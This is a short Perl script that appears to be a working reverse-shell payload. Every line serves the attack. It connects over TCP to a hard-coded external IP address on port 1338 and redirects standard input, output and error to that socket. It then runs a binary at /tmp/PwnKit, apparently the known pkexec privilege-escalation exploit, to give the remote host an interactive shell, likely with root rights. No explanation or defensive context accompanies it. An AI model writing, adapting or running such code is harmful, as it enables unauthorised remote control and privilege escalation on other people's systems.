#!/usr/bin/perl
use Socket;
$iaddr=inet_aton("49.50.10.103") || die("Error: $!\n");
$paddr=sockaddr_in("1338", $iaddr) || die("Error: $!\n");
$proto=getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
connect(SOCKET, $paddr) || die("Error: $!\n");
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
system("/tmp/PwnKit '/bin/sh -i'");
close(STDIN);
close(STDOUT);
close(STDERR);